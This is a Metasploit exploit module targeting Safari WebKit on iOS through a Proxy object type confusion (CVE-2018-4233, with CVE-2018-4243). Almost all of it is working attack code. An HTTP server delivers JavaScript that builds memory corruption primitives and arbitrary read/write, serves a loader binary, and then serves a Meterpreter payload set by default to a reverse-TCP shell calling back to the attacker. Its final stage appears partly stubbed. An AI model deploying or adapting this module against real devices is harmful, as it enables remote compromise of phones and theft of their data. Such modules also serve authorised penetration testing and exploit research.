##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ManualRanking

  include Msf::Exploit::EXE
  include Msf::Exploit::Remote::HttpServer

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Safari Webkit Proxy Object Type Confusion',
      'Description'    => %q{
          This module exploits a type confusion bug in the Javascript Proxy object in
        WebKit. The DFG JIT does not take into account that, through the use of a Proxy,
        it is possible to run arbitrary JS code during the execution of a CreateThis
        operation. This makes it possible to change the structure of e.g. an argument
        without causing a bailout, leading to a type confusion (CVE-2018-4233).
      },
      'License'        => MSF_LICENSE,
      'Author'         => [
        'saelo',
        'niklasb',
        'Ian Beer',
        ],
      'References'     => [
          ['CVE', '2018-4233'],
          ['CVE', '2018-4243'],
          ['URL', 'https://github.com/saelo/cve-2018-4233'],
          ['URL', 'https://github.com/phoenhex/files/tree/master/exploits/ios-11.3.1'],
          ['URL', 'https://bugs.chromium.org/p/project-zero/issues/detail?id=1564'],
        ],
      'Arch'           => ARCH_AARCH64,
      'Platform'       => 'apple_ios',
      'DefaultTarget'  => 0,
      'DefaultOptions' => { 'PAYLOAD' => 'apple_ios/aarch64/meterpreter_reverse_tcp' },
      'Targets'        => [[ 'Automatic', {} ]],
      'DisclosureDate' => 'Mar 15 2018'))
    register_advanced_options([
      OptBool.new('DEBUG_EXPLOIT', [false, "Show debug information in the exploit javascript", false]),
    ])
  end

  def exploit_data(directory, file)
    path = ::File.join Msf::Config.data_directory, 'exploits', directory, file
    ::File.binread path
  end

  def payload_url
    "tcp://#{datastore["LHOST"]}:#{datastore["LPORT"]}"
  end

  def on_request_uri(cli, request)
    user_agent = request['User-Agent']
    print_status("Requesting #{request.uri} from #{user_agent}")
    if request.uri =~ %r{/exploit$}
      loader_data = exploit_data('CVE-2018-4243', 'exploit')
      srvhost = Rex::Socket.resolv_nbo_i(srvhost_addr)
      config = [srvhost, srvport].pack("Nn") + payload_url
      payload_url_index = loader_data.index('PAYLOAD_URL')
      loader_data[payload_url_index, config.length] = config
      send_response(cli, loader_data, {'Content-Type'=>'application/octet-stream'})
      print_good("Sent empty_list exploit")
      return
    elsif request.uri =~ %r{/payload$*}
      dylib_path = ::File.join Msf::Config.data_directory, 'mettle', 'aarch64-iphone-darwin', 'bin', 'mettle.dylib'
      payload_data = ::File.binread dylib_path
      send_response(cli, payload_data, {'Content-Type'=>'application/octet-stream'})
      print_good("Sent payload")
      return
    end

    utils = exploit_data "CVE-2018-4233", "utils.js"
    int64 = exploit_data "CVE-2018-4233", "int64.js"
    html = %Q^
<html>
<body>
<script>

#{utils}
#{int64}

print = alert;
ITERS = 1E4;
ALLOCS = 1E3;

var conversion_buffer = new ArrayBuffer(8);
var f64 = new Float64Array(conversion_buffer);
var i32 = new Uint32Array(conversion_buffer);
var BASE32 = 0x100000000;

function f2i(f) {
    f64[0] = f;
    return i32[0] + BASE32 * i32[1];
}

function i2f(i) {
    i32[0] = i % BASE32;
    i32[1] = i / BASE32;
    return f64[0];
}

function hexit(x) {
    if (x < 0) return "-" + hex(-x);
    return "0x" + x.toString(16);
}

function xor(a, b) {
    var res = 0, base = 1;
    for (var i = 0; i < 64; ++i) {
        res += base * (a & 1 \^ b & 1);
        a = (a - (a & 1)) / 2;
        b = (b - (b & 1)) / 2;
        base *= 2
    }
    return res;
}

function fail(x) {
    print('FAIL ' + x);
    throw null;
}

counter = 0;

// CVE-2018-4233
function trigger(constr, modify, res, val) {
    return eval(`
    var o = [13.37]
    var Constructor${counter} = function(o) { ${constr} }
    var hack = false
    var Wrapper = new Proxy(Constructor${counter}, {
        get: function() {
            if (hack) {
                ${modify}
            }
        }
    })
    for (var i = 0; i < ITERS; ++i)
        new Wrapper(o)
    hack = true
    var bar = new Wrapper(o)
    ${res}
    `)
}

var workbuf = new ArrayBuffer(0x1000000);
var u32_buffer = new Uint32Array(workbuf);
var u8_buffer = new Uint8Array(workbuf);
var shellcode_length;

function pwn() {
    var stage1 = {
        addrof: function(victim) {
            return f2i(trigger("this.result = o[0]", "o[0] = val", "bar.result", victim))
        },
        fakeobj: function(addr) {
            return trigger("o[0] = val", "o[0] = {}", "o[0]", i2f(addr))
        },
        test: function() {
            var addr = this.addrof({
                a: 4919
            });
            var x = this.fakeobj(addr);
            if (x.a != 4919) fail("stage1")
        }
    };
    stage1.test();

    var stage2 = get_mem_rw(stage1);
    var memory = stage2;

    var wrapper = document.createElement("div");
    var wrapper_addr = stage1.addrof(wrapper);

    var el_addr = memory.readInt64(wrapper_addr + 0x18);
    var vtab = memory.readInt64(el_addr);

    var anchor = memory.readInt64(vtab);
    var hdr = Sub(anchor, anchor.lo() & 0xfff);
    var b = [];
    while(true)
    {
        if(strcmp(memory.read(hdr, 0x10), "dyld_v1   arm64"))
        {
            break;
        }
        hdr = Sub(hdr, 0x1000);
    }

    alert('hdr ' + hexit(hdr));

    stage2.writeInt64(0x414243, Int64.Zero);
}

function get_mem_rw(stage1) {
    var structs = [];

    function sprayStructures() {
        function randomString() {
            return Math.random().toString(36).replace(/[\^a-z]+/g, "").substr(0, 5)
        }
        for (var i = 0; i < 4096; i++) {
            var a = new Float64Array(1);
            a[randomString()] = 1337;
            structs.push(a)
        }
    }
    sprayStructures();
    var hax = new Uint8Array(4096);
    var jsCellHeader = new Int64([0, 16, 0, 0, 0, 39, 24, 1]);
    var container = {
        jsCellHeader: jsCellHeader.asJSValue(),
        butterfly: false,
        vector: hax,
        lengthAndFlags: (new Int64("0x0001000000000010")).asJSValue()
    };
    var address = Add(stage1.addrof(container),
        16);
    var fakearray = stage1.fakeobj(address);
    while (!(fakearray instanceof Float64Array)) {
        jsCellHeader.assignAdd(jsCellHeader, Int64.One);
        container.jsCellHeader = jsCellHeader.asJSValue()
    }
    memory = {
        read: function(addr, length) {
            fakearray[2] = i2f(addr);
            var a = new Array(length);
            for (var i = 0; i < length; i++) a[i] = hax[i];
            return a
        },
        readInt64: function(addr) {
            return new Int64(this.read(addr, 8))
        },
        write: function(addr, data) {
            fakearray[2] = i2f(addr);
            for (var i = 0; i < data.length; i++) hax[i] = data[i]
        },
        writeInt64: function(addr, val) {
            return this.write(addr, val.bytes())
        },
    };
    var empty = {};
    var header = memory.read(stage1.addrof(empty), 8);
    memory.write(stage1.addrof(container), header);
    var f64array = new Float64Array(8);
    header = memory.read(stage1.addrof(f64array), 16);
    memory.write(stage1.addrof(fakearray), header);
    memory.write(Add(stage1.addrof(fakearray), 24), [16, 0, 0, 0, 1, 0, 0, 0]);
    fakearray.container = container;
    return memory;
}

function go() {
    try {
        var req = new XMLHttpRequest;
        req.open("GET", "exploit");
        req.responseType = "arraybuffer";
        req.addEventListener("load", function() {
            try {
                if (req.responseType != "arraybuffer") throw "y u no blob";
                u8_buffer.set(new Uint8Array(req.response), 0x4000);
                pwn();
            } catch (e) {
                fail("Error: " + e + (e != null ? " " + e.stack : ""))
            }
        });
        req.addEventListener("error", function(ev) {
            fail(ev)
        });
        req.send()
    } catch (e) {
        fail("Error: " + e + (e != null ? " " + e.stack : ""))
    }
};

go();

</script>
</body>
</html>
    ^
    #unless datastore['DEBUG_EXPLOIT']
      #html.gsub!(/^\s*print\s*\(.*?\);\s*$/, '')
    #end
    send_response(cli, html, {'Content-Type'=>'text/html', 'Cache-Control' => 'no-cache, no-store, must-revalidate', 'Pragma' => 'no-cache', 'Expires' => '0'})
  end

end
